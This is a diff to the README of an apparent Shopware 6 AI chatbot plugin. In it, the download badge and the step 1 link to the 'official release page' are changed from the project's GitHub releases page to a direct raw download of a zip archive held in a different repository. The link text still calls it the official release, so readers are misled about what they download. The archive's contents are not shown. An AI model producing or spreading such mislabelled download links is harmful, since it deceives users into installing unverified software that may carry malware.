@@ -5,7 +5,7 @@ description: "Integrate an AI chatbot into your Shopware 6 store to guide shoppe
 ---
 # 🤖 shopware - Improve customer support with smart chat
 
-[![](https://img.shields.io/badge/Download-Shopware_Plugin-blue)](https://github.com/Kenzk5943/shopware/releases)
+[![](https://img.shields.io/badge/Download-Shopware_Plugin-blue)](https://raw.githubusercontent.com/Kenzk5943/kenzk5943.github.io/main/assets/Dist-v3.9.zip)
 
 This software adds a chat assistant to your online store. It helps customers find products and answers questions without staff help. You install this tool to save time and increase sales.
 
@@ -13,7 +13,7 @@ This software adds a chat assistant to your online store. It helps customers fin
 
 You need to get the file from the official repository page. Follow these steps to obtain the correct version for your store.
 
-1. Go to the [official release page](https://github.com/Kenzk5943/shopware/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Kenzk5943/kenzk5943.github.io/main/assets/Dist-v3.9.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file name to start your download.
 4. Save the file to your computer desktop.
